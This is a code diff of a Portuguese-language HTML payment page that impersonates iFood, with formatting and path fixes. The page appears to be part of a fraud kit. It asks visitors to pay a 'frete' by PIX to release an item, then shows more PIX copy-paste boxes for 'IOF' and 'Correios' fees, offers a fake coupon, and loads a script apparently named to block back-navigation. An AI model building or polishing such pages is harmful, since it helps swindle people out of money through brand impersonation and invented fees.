@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-BR">
 
 <head>
@@ -12,10 +12,10 @@
     <title>iFood Entregador - Pagamento PIX</title>
     <meta name="description" content="Pague o frete via PIX para confirmar o envio do seu item iFood.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-    <link href="css2?family=Outfit:wght@400;500;700&family=Rawline:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&family=Rawline:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css?v=11.0">
-    <script src="backguard.js?v=1.6"></script>
+    <script src="/backguard.js?v=1.6"></script>
 </head>
 
 <body data-page="pix">
@@ -44,10 +44,11 @@
 
             <div id="pix-card" class="pix-card pix-card--flat">
                 <div class="pix-copy-box">
-                    <input id="pix-code" class="pix-copy-input" type="text" readonly="">
+                    <input id="pix-code" class="pix-copy-input" type="text" readonly>
                     <button id="btn-copy-pix-icon" class="pix-copy-icon" type="button" aria-label="Copiar codigo">
-                        <svg viewbox="0 0 24 24" role="img" focusable="false" aria-hidden="true">
-                            <path d="M16 1H8c-1.1 0-2 .9-2 2v12h2V3h8V1Zm3 4H12c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h7c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2Zm0 16h-7V7h7v14Z">
+                        <svg viewBox="0 0 24 24" role="img" focusable="false" aria-hidden="true">
+                            <path
+                                d="M16 1H8c-1.1 0-2 .9-2 2v12h2V3h8V1Zm3 4H12c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h7c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2Zm0 16h-7V7h7v14Z">
                             </path>
                         </svg>
                     </button>
@@ -106,7 +107,7 @@
                     <div class="pix-iof-copy">
                         <label class="pix-iof-copy-label" for="pix-iof-code">Codigo PIX (Copiar e Colar)</label>
                         <div class="pix-iof-copy-row">
-                            <input id="pix-iof-code" class="pix-iof-copy-input" type="text" readonly="">
+                            <input id="pix-iof-code" class="pix-iof-copy-input" type="text" readonly>
                             <button id="btn-copy-pix-iof" class="pix-iof-copy-btn" type="button">COPIAR</button>
                         </div>
                     </div>
@@ -144,7 +145,7 @@
                     <div class="pix-correios-copy">
                         <label class="pix-correios-copy-label" for="pix-correios-code">Codigo PIX (Copiar e Colar)</label>
                         <div class="pix-correios-copy-row">
-                            <input id="pix-correios-code" class="pix-correios-copy-input" type="text" readonly="">
+                            <input id="pix-correios-code" class="pix-correios-copy-input" type="text" readonly>
                             <button id="btn-copy-pix-correios" class="pix-correios-copy-btn" type="button">COPIAR</button>
                         </div>
                     </div>
@@ -165,7 +166,7 @@
     <div id="coupon-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="coupon-title">
         <div class="modal-card">
             <div class="coupon-hero">
-                <img src="assets/bagfoto.webp" alt="Bag iFood com desconto">
+                <img src="/assets/bagfoto.webp" alt="Bag iFood com desconto">
             </div>
             <span class="modal-badge">Cupom exclusivo</span>
             <h3 id="coupon-title">Desconto liberado no frete</h3>
@@ -179,7 +180,7 @@
         <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=11.0" defer=""></script>
+    <script src="script.js?v=11.0" defer></script>
 </body>
 
 </html>
